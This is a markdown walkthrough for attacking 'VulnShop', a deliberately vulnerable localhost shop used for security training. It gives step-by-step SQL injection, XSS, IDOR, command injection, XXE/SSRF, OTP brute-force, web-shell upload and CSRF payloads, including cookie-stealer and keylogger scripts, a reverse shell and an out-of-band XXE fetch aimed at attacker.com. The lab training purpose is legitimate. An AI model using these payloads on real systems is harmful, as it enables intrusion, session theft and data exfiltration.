# 🧪 VulnShop - Detailed Testing Guide

This guide provides step-by-step instructions for testing each vulnerability category.

---

## 🎯 Prerequisites

1. Application running (backend on :3001, frontend on :3000)
2. Browser with Developer Tools (Chrome/Firefox)
3. Command line tool (curl, wget, or Postman)
4. Burp Suite (optional but recommended)

---

## 1️⃣ SQL Injection Testing

### 1.1 SQL Injection in Login (Authentication Bypass)

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Open the application at http://localhost:3000
2. Click "Login"
3. Enter the following credentials:
   - Username: `admin' OR '1'='1' --`
   - Password: `anything`
4. Click "Login"

**Expected Result**: You should be logged in as admin without knowing the password.

**Why it works**: The SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```
The `--` comments out the rest of the query.

**Using curl:**
```bash
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"test"}' \
  -c cookies.txt
```

### 1.2 SQL Injection in Search

**Step-by-Step:**

1. In the search bar, enter: `' OR '1'='1' --`
2. Click Search

**Expected Result**: All products are displayed regardless of search term.

**Advanced Testing:**
```bash
# Extract database structure
curl "http://localhost:3001/api/products?search=' UNION SELECT 1,name,2,3,4,5 FROM sqlite_master WHERE type='table' --"

# Extract user data
curl "http://localhost:3001/api/products?search=' UNION SELECT 1,username,password,4,5,6 FROM users --"
```

---

## 2️⃣ IDOR (Insecure Direct Object Reference) Testing

### 2.1 Access Other Users' Profiles

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Register a new account (username: `test1`, password: `test1`)
2. Login with your account
3. Open Developer Tools (F12) → Network tab
4. Click on your profile
5. Find the API request: `GET /api/users/[YOUR_ID]`
6. Note your user ID (probably 2 or 3)
7. Manually change the URL to: `http://localhost:3001/api/users/1`

**Expected Result**: You can view admin's profile (user ID 1) including email and credit.

**Using curl:**
```bash
# Access user 1 (admin)
curl http://localhost:3001/api/users/1

# Access user 2
curl http://localhost:3001/api/users/2

# Enumerate all users
for i in {1..10}; do
  echo "User $i:"
  curl http://localhost:3001/api/users/$i 2>/dev/null | jq
done
```

### 2.2 Manipulate Other Users' Cart

**Step-by-Step:**

1. Log in as user with ID 2
2. Open Burp Suite and intercept requests
3. Add a product to your cart
4. In Burp, change the userId in the URL from `/api/cart/2/add` to `/api/cart/1/add`
5. Forward the request

**Expected Result**: Product is added to admin's cart instead of yours.

**Using curl:**
```bash
# Add product to admin's cart (user ID 1)
curl -X POST http://localhost:3001/api/cart/1/add \
  -H "Content-Type: application/json" \
  -d '{"productId":1,"quantity":999}'
```

### 2.3 Wallet Manipulation

**Step-by-Step:**
```bash
# View admin's wallet
curl http://localhost:3001/api/users/1/wallet

# Add credit to admin's account
curl -X POST http://localhost:3001/api/users/1/credit-request

# Verify credit increased
curl http://localhost:3001/api/users/1/wallet
```

---

## 3️⃣ XSS (Cross-Site Scripting) Testing

### 3.1 Stored XSS in Feedback

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Login as any user
2. Navigate to Feedback page
3. Enter the following in the message field:
   ```html
   <script>alert('XSS')</script>
   ```
4. Submit feedback
5. Login as admin
6. Navigate to Feedback page

**Expected Result**: Alert box appears when admin views feedback.

**More Advanced XSS Payloads:**

```html
<!-- Cookie Stealer -->
<script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>

<!-- Image-based XSS (if script blocked) -->
<img src=x onerror=alert('XSS')>

<!-- Event handler XSS -->
<body onload=alert('XSS')>
```

### 3.2 XSS in Product Reviews

**Step-by-Step:**

1. Go to any product
2. Click "View Reviews"
3. Enter XSS payload in review field:
   ```html
   <img src=x onerror=alert(document.cookie)>
   ```
4. Submit review

**Expected Result**: XSS executes when anyone views the product reviews.

---

## 4️⃣ Path Traversal Testing

### 4.1 Image Path Traversal

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Try to access: `http://localhost:3001/api/products/image?file=../../../../etc/passwd`

**Expected Result**: Contents of /etc/passwd are displayed (on Linux/Mac).

**Windows Testing:**
```
http://localhost:3001/api/products/image?file=../../../../windows/win.ini
```

**More Targets:**
```bash
# View application files
http://localhost:3001/api/products/image?file=../../../server.js
http://localhost:3001/api/products/image?file=../../../package.json

# Database file (if accessible)
http://localhost:3001/api/products/image?file=../../../../database/ecommerce.db
```

### 4.2 File Browser Traversal

**Step-by-Step:**
```bash
# Traverse up from public directory
curl "http://localhost:3001/api/files?path=../../"

# Access backend source code
curl "http://localhost:3001/api/files?path=../../backend"

# Access database directory
curl "http://localhost:3001/api/files?path=../../database"
```

---

## 5️⃣ Command Injection Testing

### 5.1 Admin Logs Command Injection

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Login as admin (admin/admin)
2. Navigate to Admin Panel
3. In the "View Logs" section, enter:
   ```bash
   cat access.log; whoami
   ```
4. Click Execute

**Expected Result**: Log contents are displayed, followed by current username.

**Advanced Payloads:**

```bash
# List directory contents
cat access.log; ls -la

# Read sensitive files
cat access.log; cat ../database/ecommerce.db

# Check environment variables
cat access.log; env

# Network information
cat access.log; ifconfig

# Reverse shell (advanced)
cat access.log; nc attacker.com 4444 -e /bin/bash
```

**Using curl:**
```bash
curl -X POST http://localhost:3001/api/admin/logs \
  -H "Content-Type: application/json" \
  -d '{"command":"cat access.log; id; pwd; ls -la"}'
```

---

## 6️⃣ XXE (XML External Entity) Testing

### 6.1 Basic XXE - File Reading

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Use curl or Burp to send XXE payload:
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>'
```

**Expected Result**: Contents of /etc/passwd in the response.

### 6.2 XXE to SSRF

**Difficulty**: 🔴 Advanced

**Step-by-Step:**

1. First, verify internal metrics endpoint exists:
```bash
curl http://localhost:3001/metrics
# Should return 403 Forbidden (external access blocked)
```

2. Use XXE to access it internally:
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://localhost:3001/metrics">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>'
```

**Expected Result**: Internal metrics data is leaked, including secret_key and database_password.

### 6.3 XXE Data Exfiltration

**Advanced payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<stockCheck>
  <productId>%send;</productId>
</stockCheck>
```

---

## 7️⃣ Authentication Vulnerabilities Testing

### 7.1 Session Persistence After Logout

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Login to the application
2. Open Developer Tools → Application/Storage → Cookies
3. Note the `authToken` value
4. Click Logout
5. Check cookies again

**Expected Result**: `authToken` cookie is still present.

6. Add the cookie back manually if removed
7. Refresh the page

**Expected Result**: You're still logged in.

### 7.2 Username Overwrite Attack

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Register a new account (username: `victim`, password: `password123`)
2. Login and note your initial credit ($100)
3. Logout
4. Register again with the same username: `victim`, new password: `hacked`
5. Login with new credentials

**Expected Result**: You can access the account with new password, original data is gone.

### 7.3 OTP Brute Force

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Create an account and enable OTP
2. Trigger OTP generation by logging in
3. Use a script to brute force:

```bash
#!/bin/bash
for i in {0000..9999}; do
  echo "Trying OTP: $i"
  response=$(curl -s -X POST http://localhost:3001/api/auth/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"victim\",\"otp\":\"$i\"}")
  
  if [[ $response == *"success\":true"* ]]; then
    echo "Found OTP: $i"
    break
  fi
done
```

### 7.4 OTP Response Manipulation

**Step-by-Step:**

1. Enable OTP on an account
2. Open Burp Suite Proxy
3. Login and trigger OTP
4. Enter incorrect OTP (e.g., 0000)
5. In Burp, intercept the response
6. Change `"valid": false` to `"valid": true`
7. Forward the modified response

**Expected Result**: You're logged in without valid OTP.

### 7.5 Password Reset Token Reuse

**Difficulty**: 🔴 Advanced

**Step-by-Step:**

1. Create two accounts: user1 and user2
2. Request password reset for user1
3. Check email/logs for reset token
4. Use that token but specify user2's ID:

```bash
curl -X POST http://localhost:3001/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token":"[token_from_user1]",
    "userId":2,
    "newPassword":"hacked123"
  }'
```

**Expected Result**: User2's password is changed using user1's token.

---

## 8️⃣ File Upload Vulnerabilities

### 8.1 Content-Type Bypass

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Create a malicious file (e.g., shell.php):
```php
<?php system($_GET['cmd']); ?>
```

2. Upload with spoofed Content-Type:
```bash
curl -X POST http://localhost:3001/api/feedback \
  -F "userId=1" \
  -F "message=Test" \
  -F "file=@shell.php;type=application/pdf"
```

3. Access uploaded file:
```bash
# Find uploaded file name in response
curl http://localhost:3001/uploads/feedback/[timestamp]-shell.php?cmd=whoami
```

### 8.2 Profile Photo Upload

**Step-by-Step:**

1. Create an HTML file with JavaScript:
```html
<html>
<body>
<script>alert('XSS via Upload')</script>
</body>
</html>
```

2. Upload as profile photo:
```bash
curl -X POST http://localhost:3001/api/users/1/profile-photo \
  -F "file=@malicious.html;type=image/jpeg"
```

3. Access the uploaded file:
```
http://localhost:3001/uploads/profile/[timestamp]-malicious.html
```

---

## 9️⃣ Information Disclosure Testing

### 9.1 Directory Listing

**Difficulty**: 🟢 Beginner

**Step-by-Step:**

1. Navigate to: `http://localhost:3001/uploads/`
2. Navigate to: `http://localhost:3001/uploads/profile/`

**Expected Result**: Directory contents are listed.

### 9.2 .git Directory Exposure

**Step-by-Step:**

1. Access: `http://localhost:3001/.git/`
2. Download: `http://localhost:3001/.git/logs.txt`

**Expected Result**: Git commit messages containing sensitive information (passwords, API keys).

### 9.3 robots.txt Leak

**Step-by-Step:**

1. Access: `http://localhost:3001/robots.txt`

**Expected Result**: Reveals hidden `/dependencies/` directory.

2. Access: `http://localhost:3001/dependencies/`

---

## 🔟 Business Logic Vulnerabilities

### 10.1 Purchase Out-of-Stock Items

**Step-by-Step:**

1. Find product with stock = 0
2. Add it to cart anyway (the button might be disabled in UI, but API isn't protected)
```bash
curl -X POST http://localhost:3001/api/cart/1/add \
  -H "Content-Type: application/json" \
  -d '{"productId":1,"quantity":100}'
```

3. Checkout
```bash
curl -X POST http://localhost:3001/api/orders/1/checkout
```

**Expected Result**: Order succeeds even though item is out of stock.

### 10.2 Purchase Without Sufficient Funds

**Step-by-Step:**

1. Add expensive items to cart (total > your credit)
2. Checkout

**Expected Result**: Order succeeds, credit goes negative.

### 10.3 Self-Credit Addition

**Step-by-Step:**
```bash
# Check current credit
curl http://localhost:3001/api/users/2/wallet

# Add credit to yourself
curl -X POST http://localhost:3001/api/users/2/credit-request

# Verify credit increased
curl http://localhost:3001/api/users/2/wallet
```

---

## 1️⃣1️⃣ CSRF Testing

### 11.1 Address Update CSRF

**Difficulty**: 🟡 Intermediate

**Step-by-Step:**

1. Create an HTML file (csrf.html):
```html
<html>
<body>
<h1>Win a Free iPhone!</h1>
<img src="http://localhost:3001/api/users/1/address?data=Attacker Address 123" style="display:none">
</body>
</html>
```

2. Host it on a web server
3. Send link to victim
4. When victim (logged in) clicks link, their address is changed

---

## 1️⃣2️⃣ HTTP Method Testing

### 12.1 TRACE Method

**Difficulty**: 🔴 Advanced

**Step-by-Step:**
```bash
curl -X TRACE http://localhost:3001/api/admin/server-stats -v
```

**Expected Result**: Response headers reveal `X-Internal-Auth-Key: secret_metric_key_12345`

---

## 📝 Testing Checklist

Use this checklist to track your progress:

- [ ] SQL Injection - Login
- [ ] SQL Injection - Search
- [ ] IDOR - User Profile
- [ ] IDOR - Wallet
- [ ] IDOR - Cart
- [ ] XSS - Feedback
- [ ] XSS - Reviews
- [ ] Path Traversal - Images
- [ ] Path Traversal - File Browser
- [ ] Command Injection
- [ ] XXE - File Read
- [ ] XXE to SSRF
- [ ] Session Persistence
- [ ] Username Overwrite
- [ ] OTP Brute Force
- [ ] OTP Response Manipulation
- [ ] Reset Token Reuse
- [ ] File Upload Bypass
- [ ] Directory Listing
- [ ] .git Exposure
- [ ] Business Logic - Stock Bypass
- [ ] Business Logic - Credit Manipulation
- [ ] CSRF
- [ ] TRACE Method

---

## 🎓 Next Steps

After completing this guide:

1. **Write Exploits**: Create Python scripts to automate exploitation
2. **Chain Vulnerabilities**: Combine multiple vulnerabilities for greater impact
3. **Study Remediation**: Learn how to fix each vulnerability
4. **Practice on Other Platforms**: Try HackTheBox, TryHackMe, PortSwigger Academy
5. **Read Bug Bounty Reports**: Study real-world vulnerabilities on HackerOne

---

## ⚠️ Ethical Reminder

- Only test on systems you own or have permission to test
- Never use these techniques on production systems
- Always practice responsible disclosure
- Respect user privacy and data

Happy (Ethical) Hacking! 🎯
